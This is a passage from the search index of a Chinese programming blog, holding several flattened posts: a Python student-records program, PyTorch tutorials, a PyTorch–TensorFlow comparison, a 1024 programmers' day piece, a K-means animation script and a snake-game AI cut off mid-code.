print(\"序号 学号 姓名 成绩 \") i = 0 for tempInfo in CS1.allstu: print(\"%d %s %s %s\" % (i + 1, CS1.allstu[i].get('stuid'), CS1.allstu[i].get('stuname'),CS1.allstu[i].get('score'))) i += 1 elif key == '6': CS1.Output_txt() print(\"=\" * 30) print(\"外部文件已导出...\") # Output_txt elif key == '7': CS1.Input_txt() print(\"=\" * 30) # Input_txt print(\"外部文件数据已导入...\") elif key == '8': pass print(\"=\" * 30) # Output_txt_s(stu_collection) print(\"外部加密文件已导出...\") elif key == '9': pass print(\"=\" * 30) # Input_txt_s(stu_collection) print(\"外部文件数据已解读...\")if __name__ == '__main__': main() 子函数：gro.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990class stu: stuid = \"001\"; stuname = \"zhangsan\"; score = 80; def printstu(self): print(self.stuid) print(self.stuname) print(self.score) def savestudent(self): exmaple = {'stuid': 123, 'stuname': 'xxx', 'score': 100} temp = exmaple.fromkeys(['stuid', 'stuname', 'score']) temp['stuid'] = self.stuid temp['stuname'] = self.stuname temp['score'] = self.score return tempclass gro: allstu = [] groname = 'CS1' def inputstu(self): newstu = stu() newstu.stuid = int(input(\"请输入学号:\\n\")) newstu.stuname = input(\"请输入学生姓名:\\n\") newstu.score = int(input(\"请输入成绩:\\n\")) newstu.savestudent() return newstu.savestudent() def addstu(self, stuobj): self.allstu.append(stuobj) def addstu_in(self): allnew = self.inputstu() self.addstu(allnew) def del_itemin(self): length = len(self.allstu) for s in range(length): if self.allstu[s]['stuid'] == int(input(\"输入删除学生的学号:\\n\")): self.allstu.pop(s) else: print(\"没有此学生相关信息!\\n\") break def modifystu(self): length = len(self.allstu) for s in range(length): if self.allstu[s].get('stuid') == int(input(\"输入修改的学生学号:\\n\")): self.allstu[s]['stuname'] = input(\"请输入预修改值(姓名):\\n\") self.allstu[s]['score'] = int(input(\"请输入预修改值(成绩):\\n\")) print(\"已修改!\\n\") else: print(\"没有此学生相关信息!\") break def printallstu(self): # 未使用 for s in self.allstu: s.printstu() print(\"-\" * 20) def sc_stu(self): length = len(self.allstu) for s in range(length): if self.allstu[s].get('stuid') == int(input(\"输入查询的学生学号:\\n\")): print(str(self.allstu[s].get('stuid')) +' ' +str(self.allstu[s].get('stuname')) + ' ' +str(self.allstu[s].get('score'))) else: print(\"没有此学生相关信息!\") break def Output_txt(self): f = open(\"pydata.txt\", \"wt\") length = len(self.allstu) for s in range(length): f.writelines(self.allstu[s] + \"\\n\") def Input_txt(self): fw = open(\"pydata.txt\", \"rt\") length = len(self.allstu) for line in fw: string = fw.readline() print(string) ts = string print(type(ts)) for s in range(len(self.allstu)): if not (ts.get('stuid') == self.allstu[s].get('stuid')): self.allstu.append(ts) print(\"读取成功!\")","link":"/2019/10/27/学生信息管理系统（python语言）/"},{"title":"pytorch实现神经网络","text":"神经网络是通过torch.nn包来构建的 然后我们先看一个神经网络的处理流程： 1 定义网络架构 2 将输入喂入神经网络 3 神经网络计算输入得出输出 3 对比输出与真实标签数据 4 计算第3步中输出与真实标签的差距，也就是loss 5 如果loss太大，就反向传播回去调整网络参数。再重复、2，3，4，知道loss小到我们的要求为止。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import torchimport torch.nn as nnimport torch.nn.functional as Fclass Net(nn.Module): def __init__(self): super(Net, self).__init__() #定义卷积核 1是输入通道数，6是输出通道数，5是指5×5的卷积 #所以类推就是第一个参数是输入通道，第二个是输出通道，第三个是卷积核尺寸 self.conv1 = nn.Conv2d(1, 6, 5) self.conv2 = nn.Conv2d(6, 16, 5) #定义全连接参数 self.fc1 = nn.Linear(16*5*5, 120) self.fc2 = nn.Linear(120, 84) self.fc3 = nn.Linear(84, 10) #定义前向传播 def forward(self, x): #将第一层卷积后的结果放入激活函数relu 再 最大池化一下，（2，2）是池化的步长 x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2)) #同上一层一样，不过有一点不一样就是如果x是正方形，也就是长宽都相等的话，步长可以只指定一个数字 x = F.max_pool2d(F.relu(self.conv2(x)), 2) # 这个是将x变成一维数组，为全连接层做准备 x = x.view(-1, self.num_flat_features(x)) #全连接层 x = F.relu(self.fc1(x)) x = F.relu(self.fc2(x)) x = self.fc3(x) return x def num_flat_features(self, x): #第一个维度不要，因为第一个维度是输入数据的batch，batch也就是一次输入多少张图片 size = x.size()[1:] num_features = 1 for s in size: num_features*=s return num_featuresnet = Net()print(net)params = list(net.parameters())print(len(params))print(params[0].size())#自定义一个输入32*32的数据input = torch.randn(1, 1, 32, 32)out = net(input)print(out)#将所有梯度清零，然后反向传播net.zero_grad()out.backward(torch.randn(1, 10))output = net(input)target = torch.randn(10) #我们定义的真实值target = target.view(1, -1)#将真实值的维度改成和输出值的维度criterion = nn.MSELoss()loss = criterion(output, target)print(loss)print(loss.grad_fn) # MSELossprint(loss.grad_fn.next_functions[0][0]) # Linearprint(loss.grad_fn.next_functions[0][0].next_functions[0][0])#清零梯度net.zero_grad()print('反向传播前第一层参数b')print(net.conv1.bias.grad)loss.backward()print('反向传播后第一层参数b')print(net.conv1.bias.grad)learning_rate = 0.01for f in net.parameters(): f.data.sub_(f.grad.data * learning_rate)import torch.optim as optimoptimizer = optim.SGD(net.parameters(), lr=0.01)optimizer.step()","link":"/2019/10/27/pytorch实现神经网络/"},{"title":"pytorch与tensorflow两大框架对比","text":"如果你在读这篇文章，那么你可能已经开始了自己的深度学习之旅。如果你对这一领域还不是很熟悉，那么简单来说，深度学习使用了「人工神经网络」，这是一种类似大脑的特殊架构，这个领域的发展目标是开发出能解决真实世界问题的类人计算机。为了帮助开发这些架构，谷歌、Facebook 和 Uber 等科技巨头已经为 Python 深度学习环境发布了多款框架，这让人们可以更轻松地学习、构建和训练不同类型的神经网络。 目录 谷歌的 TensorFlow Facebook 的 PyTorch 我们可以用 TensorFlow 和 PyTorch 构建什么？ PyTorch 和 TensorFlow 对比 PyTorch 和 TensorFlow 的优点和缺点 PyTorch 和 TensorFlow 安装、版本、更新 TensorFlow 还是 PyTorch？我的建议 1.谷歌的 TensorFlowTensorFlow 是谷歌的开发者创造的一款开源的深度学习框架，于 2015 年发布。官方研究发布于论文《TensorFlow：异构分布式系统上的大规模机器学习》。 论文地址：http://download.tensorflow.org/paper/whitepaper2015.pdf TensorFlow 现已被公司、企业与创业公司广泛用于自动化工作任务和开发新系统，其在分布式训练支持、可扩展的生产和部署选项、多种设备（比如安卓）支持方面备受好评。 2.Facebook 的 PyTorchPyTorch 是最新的深度学习框架之一，由 Facebook 的团队开发，并于 2017 年在 GitHub 上开源。有关其开发的更多信息请参阅论文《PyTorch 中的自动微分》。 论文地址：https://openreview.net/pdf?id=BJJsrmfCZ PyTorch 很简洁、易于使用、支持动态计算图而且内存使用很高效，因此越来越受欢迎。接下来还会更详细地介绍。 3.我们可以用 TensorFlow 和 PyTorch 构建什么？神经网络起初是被用于解决手写数字识别或用相机识别汽车注册车牌等简单的分类问题。但随着近来框架的发展以及英伟达高计算性能图形处理单元（GPU）的进步，我们可以在 TB 级的数据上训练神经网络并求解远远更加复杂的问题。一个值得提及的成就是在 TensorFlow 和 PyTorch 中实现的卷积神经网络在 ImageNet 上都达到了当前最佳的表现。训练后的模型可以用在不同的应用中，比如目标检测、图像语义分割等等。 尽管神经网络架构可以基于任何框架实现，但结果却并不一样。训练过程有大量参数都与框架息息相关。举个例子，如果你在 PyTorch 上训练一个数据集，那么你可以使用 GPU 来增强其训练过程，因为它们运行在 CUDA（一种 C++ 后端）上。TensorFlow 也能使用 GPU，但它使用的是自己内置的 GPU 加速。因此，根据你所选框架的不同，训练模型的时间也总是各不相同。 一、TensorFlow 顶级项目 Magenta：一个探索将机器学习用作创造过程的工具的开源研究项目：https://magenta.tensorflow.org/ Sonnet：这是一个基于 TensorFlow 的软件库，可用于构建复杂的神经网络：https://sonnet.dev/ Ludwig：这是一个无需写代码就能训练和测试深度学习模型的工具箱：https://uber.github.io/ludwig/ 二、PyTorch 顶级项目 CheXNet：使用深度学习来分析胸部 X 光照片，能实现放射科医生水平的肺炎监测：https://stanfordmlgroup.github.io/projects/chexnet/ PYRO：这是一种用 Python 编写的通用概率编程语言（PPL），后端由 PyTorch 支持：https://pyro.ai (https://pyro.ai/) Horizon：一个用于应用强化学习（Applied RL）的平台：https://horizonrl.com (https://horizonrl.com/) 这些只是基于 TensorFlow 和 PyTorch 构建的少量框架和项目。你能在 TensorFlow 和 PyTorch 的 GitHub 和官网上找到更多。 4.PyTorch 和 TensorFlow 对比PyTorch 和 TensorFlow 的关键差异是它们执行代码的方式。这两个框架都基于基础数据类型张量（tensor）而工作。你可以将张量看作是下图所示的多维数组。 机制：动态图定义与静态图定义 TensorFlow 框架由两个核心构建模块组成： 一个用于定义计算图以及在各种不同硬件上执行这些图的运行时间的软件库。 一个具有许多优点的计算图（后面很快就会介绍这些优点）。 计算图是一种将计算描述成有向图的抽象方式。图是一种由节点（顶点）和边构成的数据结构，是由有向的边成对连接的顶点的集合。 当你在 TensorFlow 中运行代码时，计算图是以静态方式定义的。与外部世界的所有通信都是通过 tf.Sessionobject 和 tf.Placeholder 执行，它们是在运行时会被外部数据替换的张量。例如，看看以下代码段： 下图是 TensorFlow 中运行代码之前以静态方式生成计算图的方式。计算图的核心优势是能实现并行化或依赖驱动式调度（dependency driving scheduling），这能让训练速度更快，更有效率。 类似于 TensorFlow，PyTorch 也有两个核心模块： 计算图的按需和动态构建 Autograd：执行动态图的自动微分 可以在下图中看到，图会随着执行过程而改变和执行节点，没有特殊的会话接口或占位符。整体而言，这个框架与 Python 语言的整合更紧密，大多数时候感觉更本地化。因此，PyTorch 是更 Python 化的框架，而 TensorFlow 则感觉完全是一种新语言。 根据你所用的框架，在软件领域有很大的不同。TensorFlow 提供了使用 TensorFlow Fold 库实现动态图的方式，而 PyTorch 的动态图是内置的。 分布式训练 PyTorch 和 TensorFlow 的一个主要差异特点是数据并行化。PyTorch 优化性能的方式是利用 Python 对异步执行的本地支持。而用 TensorFlow 时，你必须手动编写代码，并微调要在特定设备上运行的每个操作，以实现分布式训练。但是，你可以将 PyTorch 中的所有功能都复现到 TensorFlow 中，但这需要做很多工作。下面的代码片段展示了用 PyTorch 为模型实现分布式训练的简单示例： 可视化 在训练过程的可视化方面，TensorFlow 更有优势。可视化能帮助开发者跟踪训练过程以及实现更方便的调试。TensorFlow 的可视化库名为 TensorBoard。PyTorch 开发者则使用 Visdom，但是 Visdom 提供的功能很简单且有限，所以 TensorBoard 在训练过程可视化方面更好。 TensorBoard 的特性： 跟踪和可视化损失和准确度等指标 可视化计算图（操作和层） 查看权重、偏差或其它张量随时间变化的直方图 展示图像、文本和音频数据 分析 TensorFlow 程序 Visdom 的特性 处理回调 绘制图表和细节 管理环境 生产部署 在将训练好的模型部署到生产方面，TensorFlow 显然是赢家。我们可以直接使用 TensorFlow serving 在 TensorFlow 中部署模型，这是一种使用了 REST Client API 的框架。 使用 PyTorch 时，在最新的 1.0 稳定版中，生产部署要容易一些，但它没有提供任何用于在网络上直接部署模型的框架。你必须使用 Flask 或 Django 作为后端服务器。所以，如果要考虑性能，TensorFlow serving 可能是更好的选择。 用 PyTorch 和 TensorFlow 定义一个简单的神经网络 我们比较一下如何在 PyTorch 和 TensorFlow 中声明神经网络。 在 PyTorch 中，神经网络是一个类，我们可以使用 torch.nn 软件包导入构建架构所必需的层。所有的层都首先在 init() 方法中声明，然后在 forward() 方法中定义输入 x 在网络所有层中的遍历方式。最后，我们声明一个变量模型并将其分配给定义的架构（model = NeuralNet()）。 近期 Keras 被合并到了 TensorFlow 库中，这是一个使用 TensorFlow 作为后端的神经网络框架。从那时起，在 TensorFlow 中声明层的句法就与 Keras 的句法类似了。首先，我们声明变量并将其分配给我们将要声明的架构类型，这里的例子是一个 Sequential() 架构。 接下来，我们使用 model.add() 方法以序列方式直接添加层。层的类型可以从 tf.layers 导入，如下代码片段所示： 5.TensorFlow 和 PyTorch 的优缺点TensorFlow和PyTorch各有其优缺点。 TensorFlow 的优点： 简单的内置高级 API 使用 TensorBoard 可视化训练 通过 TensorFlow serving 容易实现生产部署 很容易的移动平台支持 开源 良好的文档和社区支持 TensorFlow 的缺点： 静态图 调试方法 难以快速修改 PyTorch 的优点 类 Python 的代码 动态图 轻松快速的编辑 良好的文档和社区支持 开源 很多项目都使用 PyTorch PyTorch 的缺点： 可视化需要第三方 生产部署需要 API 服务器 6.PyTorch 和 TensorFlow 安装、版本、更新具体看我的另外一篇文章：:point_right: Anaconda3安装tf/pytorch/keras 7.TensorFlow 还是 PyTorch？ TensorFlow 是一种非常强大和成熟的深度学习库，具有很强的可视化功能和多个用于高级模型开发的选项。它有面向生产部署的选项，并且支持移动平台。另一方面，PyTorch 框架还很年轻，拥有更强的社区动员，而且它对 Python 友好。 我的建议是如果你想更快速地开发和构建 AI 相关产品，TensorFlow 是很好的选择。建议研究型开发者使用 PyTorch，因为它支持快速和动态的训练。","link":"/2019/10/27/pytorch与tensorflow两大框架对比/"},{"title":"1024节日快乐","text":"1024程序猿节日来源1024 是 2 的 10 次方，常用于存储空间的定义：1M = 1024K 。程序员就像是一个个 1024，以最低调、踏实、核心的功能模块搭建起这个科技世界。1G=1024M，而 1G 与 1 级谐音，也有一级棒的意思。从 2015 年起，每年 10 月 24 日被定义为程序员节。向通过 Coding 改变世界，追求技术知识创新的程序员们致敬。 结果呢？随着 IT 行业高收入，大家对程序员越来越关注，都以为程序员是： 而实际上他们是： “多金”也是程序员的重要标签根据饿了么与挖财发布的《互联网从业者生活品质报告》统计10%程序员的年收入高于50万有近5成的程序员年薪在20万以上 还有很多人说程序员木讷、不解风情其实是你不懂程序员的浪漫95后程序员韦若琛曾错过常人眼中的“520”，选择在5月22日表白，因为在他头脑里，5×16×16+2×16+2=1282+32=1314，522是16进制的1314，是黑客情人节。正所谓“程序员浪起漫来，真没你啥事了”看看下面这串代码感受一下 如今，在父母们眼里程序员高收入、工作稳定、老实不容易出轨俨然成了相亲市场上的“抢手货”就在去年阿里巴巴举办的开发者大会上有位家长就到现场为女儿张贴了征婚启示指定要“程序员” 曾有打油诗如此形容程序员这一职业“十年编程两茫茫，工期短，需求长。千行代码，Bug 何处藏。纵使上线又如何，新版本，继续忙。黑白颠倒没商量，睡地铺，吃食堂。夜半梦醒，无人在身旁。最怕灯火阑珊时，手机响，心里慌。” 未来可期 程序员之歌在那山的那边海的那边有一群程序猿他们老实又腼腆他们聪明又有钱他们一天到晚坐在那里认真地改bug他们饿了就吃一口方便面噢~可爱的程序员~可爱的程序员~只要一提需求他们就要重新改一遍可是时间只剩下最后一天","link":"/2019/10/24/1024节日快乐/"},{"title":"pytorch的基石-tensor张量","text":"学习使用前准备： 安装pytorch pytorch安装问题解决 目前我的pytorch仍然存在使用问题… 1.tensor数学要介绍Tensor这个数据类型，我觉得有必要扯一下数学。 我们都知道： 标量（Scalar）是只有大小，没有方向的量，如1，2，3等 向量（Vector）是有大小和方向的量，其实就是一串数字，如(1,2) 矩阵（Matrix）是好几个向量拍成一排合并而成的一堆数字，如[1,2;3,4] 那么张量（Tensor）是什么呢？是按照三维排列的一堆数字？ 是的。但是也不完全正确。 其实标量，向量，矩阵它们三个也是张量，标量是零维的张量，向量是一维的张量，矩阵是二维的张量。 除此之外，张量还可以是四维的、五维的等等 数学扯完了，我们撸串代码操练操练。 2.基础练习1234567891011import torch #引用torch包x = torch.Tensor(2,3) #构造一个2x3的矩阵，没初始化但仍然会有值print(x)'''8.0118e+28 4.5768e-41 8.0118e+284.5768e-41 2.9747e-37 1.4013e-45[torch.FloatTensor of size 2x3] #可以看出数据类型是浮点数的2x3矩阵''' 看矩阵看不出张量的道道，我们来点刺激的 1234567891011121314151617181920212223242526272829303132333435363738394041424344y=torch.Tensor(4,2,3) #构造一个4x2x3的张量，没初始化print(y)'''(0 ,.,.) =1.00000e-29 *0.0000 2.5244 0.00002.5244 0.0000 0.0000(1 ,.,.) =1.00000e-29 *0.0000 0.0000 0.00000.0000 0.0000 0.0000(2 ,.,.) =1.00000e-29 *0.0000 0.0000 0.00000.0000 0.0000 0.0000(3 ,.,.) =1.00000e-29 *0.0000 0.0000 0.00002.5244 0.0000 2.5244[torch.FloatTensor of size 4x2x3]''' 我们从上面的返回值可以看出，4x2x3的张量y由4个2x3的矩阵构成，这符合了我们数学上的定义。 3.Tensor的加法(四种)我们先初始化两个张量： 1234567891011121314151617第一种：&gt;&gt;&gt;a+b第二种：&gt;&gt;&gt;torch.add(a,b)第三种：&gt;&gt;&gt;result = torch.Tensor(5,3)&gt;&gt;&gt;torch.add(a,b,out=result) #把运算结果存储在result上第四种：&gt;&gt;&gt;b.add_(a) #把运算结果覆盖掉b 4.Tensor的部分截取 5.Tensor的其他操作除了加法以外，还有上百种张量的操作，比如说转置（transposing），切片（slicing）等，送个链接 给少侠，少侠自己在家慢慢操练了🏇。 6.Tensor与numpy的Array的相互转换torch的tensor可以与numpy的array进行转换 （1）tensor⇒array1&gt;&gt;&gt;b = a.numpy() #a为tensor （2）array⇒tensor1&gt;&gt;&gt;b = torch.from_numpy(a) #a为numpy的array 7.CUDA假如少侠你有一块nvidia的显卡并支持cuda（如GTX 1080），那么恭喜你，你可以使用显卡gpu进行tensor的运算。假如你我一样没有，考虑买一个吧 购买指南：为你的深度学习任务挑选最合适GPU:从性能到价格的全方位指南 1&gt;&gt;&gt;torch.cuda.is_available() #看看是否支持cuda 假如返回的是True那么，下面的代码将带你飞。 12345&gt;&gt;&gt;x = x.cuda()&gt;&gt;&gt;y = y.cuda()&gt;&gt;&gt;x+y #这里的x和y都是tensor，使用cuda函数以后，x和y的所有运算均会调用gpu来运算。","link":"/2019/10/23/pytorch的基石-tensor张量/"},{"title":"动态展示K-means算法","text":"1.数据集及其源代码下载 2.代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import numpy as npimport matplotlibimport matplotlib.pyplot as pltfrom matplotlib.animation import FuncAnimationclass KMeans(object): def __init__(self, data): ''' data: 要分类的数据，二维数组，每一行是一个样本，列数为样本特征数 ''' self.data = data self.calc_classes = np.frompyfunc( # 自定义ufunc，将所有样本分类 self.calc_distance, data.shape[1], 1) self.fig, self.ax = plt.subplots() def calc_distance(self, *features): ''' 计算单个样本与每个中心的距离，然后将其归于最近的一类 features: 样本的特征值 返回样本新的类别 ''' x = np.array(features) # 将样本的特征转换为一个向量 return np.argmin(np.square(self.center - x).sum(axis=1)) def clustering(self, k): ''' k: 要聚类的数量 ''' self.k = k self.sizes = np.linspace(40, 100, num=k) choices = np.random.randint(0, self.data.shape[0], size=k) self.center = np.copy(self.data[choices]) # 从data中随机选取k行作为随机中心 anim = FuncAnimation(self.fig, # 设置动画 func=self.update, # 回调函数，FuncAnimation会在每一帧都调用该函数 frames=np.arange(8), # 帧数 init_func=self.setup, # 动画初始化 interval=1000) # 每帧间隔 anim.save('clustering.gif', dpi=80, writer='pillow') def setup(self, colors=['r', 'g', 'b', 'k']): ''' 动画初始化函数 ''' cs = self.get_classified_sample() tmp = [] for i in np.arange(self.k): # 绘制已分类的样本 tmp.append(self.ax.scatter(cs[i][:,0], cs[i][:,1], c=colors[i], animated=True)) for i in np.arange(self.k): # 绘制中心 tmp.append(self.ax.scatter(self.center[i,0], self.center[i,1], c=colors[i], s=150, marker='x', animated=True)) self.sc = tuple(tmp) # 必须转换为元组 for i in np.arange(self.k): # 更新每个簇的中心 self.center[i,:] = cs[i].mean(axis=0) return self.sc # 返回必须是元组 def get_classified_sample(self): ''' 将所有样本分为k类 返回一个列表，列表中的每个元素是被归于同一类的样本 ''' cols = list(self.data.T) self.classes = self.calc_classes(*cols) # 计算所有样本的类别 return [self.data[self.classes==i] for i in np.arange(self.k)] def update(self, j): print(j) cs = self.get_classified_sample() for i in np.arange(self.k): self.sc[i].set_offsets(cs[i]) # 更新每个簇的点的坐标 self.sc[i]._sizes[0] = self.sizes[(i+j) % self.k] # 动态调增点的大小，增加视觉对比 self.sc[i+self.k].set_offsets(self.center[i]) # 更新每个簇中心的坐标 for i in np.arange(self.k): # 更新每个簇的中心 self.center[i,:] = cs[i].mean(axis=0) return self.sc # 返回必须是元组if __name__ == \"__main__\": data = np.loadtxt('./test.txt') km = KMeans(data) km.clustering(4) 3.动画展示","link":"/2019/10/22/动态展示K-means算法/"},{"title":"当你的贪吃蛇吃满屏幕后...","text":"介绍A snake AI written in python. Use curses module, Windows usersshould install it first: http://www.lfd.uci.edu/~gohlke/pythonlibs/#curses 注意:curses库在windows可以安装但还是有许多问题，建议在linux和mac下运行代码！ 怎么样运行代码？ 1python snake.py 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377# coding: utf-8import cursesfrom curses import KEY_RIGHT, KEY_LEFT, KEY_UP, KEY_DOWNfrom random import randint# 蛇运动的场地长宽HEIGHT = 10WIDTH = 20FIELD_SIZE = HEIGHT * WIDTH# 蛇头总是位于snake数组的第一个元素HEAD = 0# 用来代表不同东西的数字，由于矩阵上每个格子会处理成到达食物的路径长度，# 因此这三个变量间需要有足够大的间隔(&gt;HEIGHT*WIDTH)FOOD = 0UNDEFINED = (HEIGHT + 1) * (WIDTH + 1)SNAKE = 2 * UNDEFINED# 由于snake是一维数组，所以对应元素直接加上以下值就表示向四个方向移动LEFT = -1RIGHT = 1UP = -WIDTHDOWN = WIDTH# 错误码ERR = -1111# 用一维数组来表示二维的东西# board表示蛇运动的矩形场地# 初始化蛇头在(1,1)的地方，第0行，HEIGHT行，第0列，WIDTH列为围墙，不可用# 初始蛇长度为1board = [0] * FIELD_SIZEsnake = [0] * (FIELD_SIZE+1)snake[HEAD] = 1*WIDTH+1snake_size = 1# 与上面变量对应的临时变量，蛇试探性地移动时使用tmpboard = [0] * FIELD_SIZEtmpsnake = [0] * (FIELD_SIZE+1)tmpsnake[HEAD] = 1*WIDTH+1tmpsnake_size = 1# food:食物位置(0~FIELD_SIZE-1),初始在(3, 3)# best_move: 运动方向food = 3 * WIDTH + 3best_move = ERR# 运动方向数组mov = [LEFT, RIGHT, UP, DOWN]# 接收到的键 和 分数key = KEY_RIGHT score = 1 #分数也表示蛇长# 检查一个cell有没有被蛇身覆盖，没有覆盖则为free，返回truedef is_cell_free(idx, psize, psnake): #return not (idx in psnake[:]) #错！psnake后面还有很多没用上的单元 for i in xrange(psize): if idx == psnake[i]: return False return True # 检查某个位置idx是否可向move方向运动def is_move_possible(idx, move): flag = False if move == LEFT: flag = True if idx%WIDTH &gt; 1 else False elif move == RIGHT: flag = True if idx%WIDTH &lt; (WIDTH-2) else False elif move == UP: flag = True if idx &gt; (2*WIDTH-1) else False # 即idx/WIDTH &gt; 1 elif move == DOWN: flag = True if idx &lt; (FIELD_SIZE-2*WIDTH) else False # 即idx/WIDTH &lt; HEIGHT-2 return flag# 重置board# board_refresh后，UNDEFINED值都变为了到达食物的路径长度# 如需要还原，则要重置它def board_reset(psnake, psize, pboard): for i in xrange(FIELD_SIZE): # f.write('hello ' + str(len(pboard)) +' ' +str(i)+'\\n') if i == food: pboard[i] = FOOD elif is_cell_free(i, psize, psnake): # 该位置为空 pboard[i] = UNDEFINED else: # 该位置为蛇身 pboard[i] = SNAKE # def board_refresh(pfood, psnake, pboard):# board_changed = True# found = False# while board_changed: # 一直更新board，直到每个格子上的数都对应到达食物的步数，不能再改变为止# board_changed = False# for i in xrange(FIELD_SIZE):# if pboard[i] &lt; SNAKE: # min = pboard[i]# for j in xrange(4):# if is_move_possible(i, mov[j]) and pboard[i+mov[j]] &lt; min:# min = pboard[i+mov[j]]# if pboard[i] &gt; min+1:# pboard[i] = min + 1# board_changed = True# if ~board_changed: break # 不再改变，退出# board_changed = False# for i in xrange(FIELD_SIZE-1, -1, -1): # [FIELD_SIZE-1, 0]# if pboard[i] &lt; SNAKE:# min = pboard[i]# for j in xrange(4):# if is_move_possible(i, mov[j]) and pboard[i+mov[j]] &lt; min:# min = pboard[i+mov[j]]# if pboard[i] &gt; min+1:# pboard[i] = min + 1# board_changed = True# for i in xrange(4):# if is_move_possible(psnake[HEAD], mov[i]) and pboard[psnake[HEAD]+mov[i]]&lt;UNDEFINED:# flag = True# return flag# 广度优先搜索遍历整个board，# 计算出board中每个非SNAKE元素到达食物的路径长度def board_refresh(pfood, psnake, pboard): queue = [] queue.append(pfood) inqueue = [0] * FIELD_SIZE found = False # while循环结束后，除了蛇的身体， # 其它每个方格中的数字代码从它到食物的路径长度 #f.write('bfs begin:\\n') while len(queue)!=0: idx = queue.pop(0) if inqueue[idx] == 1: continue #f.write(str(idx)+'\\n') inqueue[idx] = 1 for i in xrange(4): if is_move_possible(idx, mov[i]): if idx + mov[i] == psnake[HEAD]: found = True if pboard[idx+mov[i]] &lt; SNAKE: # 如果该点不是蛇的身体 if pboard[idx+mov[i]] &gt; pboard[idx]+1: pboard[idx+mov[i]] = pboard[idx] + 1 if inqueue[idx+mov[i]] == 0: queue.append(idx+mov[i]) #f.write('bfs end\\n') #f.write('found: ' + str(found) +'\\n') return found# 从蛇头开始，根据board中元素值，# 从蛇头周围4个领域点中选择最短路径def choose_shortest_safe_move(psnake, pboard): best_move = ERR min = SNAKE for i in xrange(4): if is_move_possible(psnake[HEAD], mov[i]) and pboard[psnake[HEAD]+mov[i]]&lt;min: min = pboard[psnake[HEAD]+mov[i]] best_move = mov[i] return best_move# 从蛇头开始，根据board中元素值，# 从蛇头周围4个领域点中选择最远路径def choose_longest_safe_move(psnake, pboard): best_move = ERR max = -1 for i in xrange(4): if is_move_possible(psnake[HEAD], mov[i]) and pboard[psnake[HEAD]+mov[i]]&lt;UNDEFINED and pboard[psnake[HEAD]+mov[i]]&gt;max: max = pboard[psnake[HEAD]+mov[i]] best_move = mov[i] return best_move# 检查是否可以追着蛇尾运动，即蛇头和蛇尾间是有路径的# 为的是避免蛇头陷入死路# 虚拟操作，在tmpboard,tmpsnake中进行def is_tail_inside(): global tmpboard, tmpsnake, food, tmpsnake_size tmpboard[tmpsnake[tmpsnake_size-1]] = 0 # 虚拟地将蛇尾变为食物(因为是虚拟的，所以在tmpsnake,tmpboard中进行) tmpboard[food] = SNAKE # 放置食物的地方，看成蛇身 result = board_refresh(tmpsnake[tmpsnake_size-1], tmpsnake, tmpboard) # 求得每个位置到蛇尾的路径长度 for i in xrange(4): # 如果蛇头和蛇尾紧挨着，则返回False。即不能follow_tail，追着蛇尾运动了 if is_move_possible(tmpsnake[HEAD], mov[i]) and tmpsnake[HEAD]+mov[i]==tmpsnake[tmpsnake_size-1] and tmpsnake_size&gt;3: result = False return result# 让蛇头朝着蛇尾运行一步# 不管蛇身阻挡，朝蛇尾方向运行def follow_tail(): global tmpboard, tmpsnake, food, tmpsnake_size tmpsnake_size = snake_size tmpsnake = snake[:] board_reset(tmpsnake, tmpsnake_size, tmpboard) # 重置虚拟board tmpboard[tmpsnake[tmpsnake_size-1]] = FOOD # 让蛇尾成为食物 tmpboard[food] = SNAKE # 让食物的地方变成蛇身 board_refresh(tmpsnake[tmpsnake_size-1], tmpsnake, tmpboard) # 求得各个位置到达蛇尾的路径长度 tmpboard[tmpsnake[tmpsnake_size-1]] = SNAKE # 还原蛇尾 # return choose_longest_safe_move(tmpsnake, tmpboard) # 返回运行方向(让蛇头运动1步) return choose_longest_safe_move(tmpsnake, tmpboard)# 在各种方案都不行时，随便找一个可行的方向来走(1步),def any_possible_move(): global food , snake, snake_size, board best_move = ERR board_reset(snake, snake_size, board) board_refresh(food, snake, board) min = SNAKE for i in xrange(4): if is_move_possible(snake[HEAD], mov[i]) and board[snake[HEAD]+mov[i]]&lt;min: min = board[snake[HEAD]+mov[i]] best_move = mov[i] return best_movedef shift_array(arr, size): for i in xrange(size, 0, -1): arr[i] = arr[i-1]def new_food(): global food, snake_size if snake_size &gt;= FIELD_SIZE-1: return cell_free = False while not cell_free: w = randint(1, WIDTH-2) h = randint(1, HEIGHT-2) food = h * WIDTH + w cell_free = is_cell_free(food, snake_size, snake) win.addch(food/WIDTH, food%WIDTH, '@')# 真正的蛇在这个函数中，朝pbest_move走1步def make_move(pbest_move): global key, snake, board, snake_size, score shift_array(snake, snake_size) snake[HEAD] += pbest_move # 按esc退出，getch同时保证绘图的流畅性，没有它只会看到最终结果 win.timeout(10) event = win.getch() key = key if event == -1 else event if key == 27: return p = snake[HEAD] win.addch(p/WIDTH, p%WIDTH, '*') # 如果新加入的蛇头就是食物的位置 # 蛇长加1，产生新的食物，重置board(因为原来那些路径长度已经用不上了) if snake[HEAD] == food: board[snake[HEAD]] = SNAKE # 新的蛇头 snake_size += 1 score += 1 if snake_size &lt; FIELD_SIZE: new_food() #board_reset(snake, board) # #return True else: # 如果新加入的蛇头不是食物的位置 board[snake[HEAD]] = SNAKE # 新的蛇头 board[snake[snake_size]] = UNDEFINED # 蛇尾变为空格 win.addch(snake[snake_size]/WIDTH, snake[snake_size]%WIDTH, ' ') #return False # test 打印tmpboard for i in xrange(HEIGHT): for j in xrange(WIDTH): k = board[i*WIDTH+j] f.write(str(k)+' ') 